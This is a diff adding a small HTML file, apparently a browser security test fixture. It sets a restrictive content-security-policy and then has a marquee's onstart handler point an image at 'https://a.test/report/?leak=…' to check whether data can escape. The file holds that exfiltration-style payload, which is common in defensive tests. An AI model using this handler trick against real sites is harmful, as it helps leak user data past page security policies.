@@ -1,0 +1,8 @@
+<head>
+<meta http-equiv="content-security-policy" content="default-src 'self'; script-src 'unsafe-eval'">
+</head>
+<img id="123" />
+
+<marquee
+  onstart='document.getElementById("123").src = "https://a.test/report/?leak=f1312272"'
+></marquee>
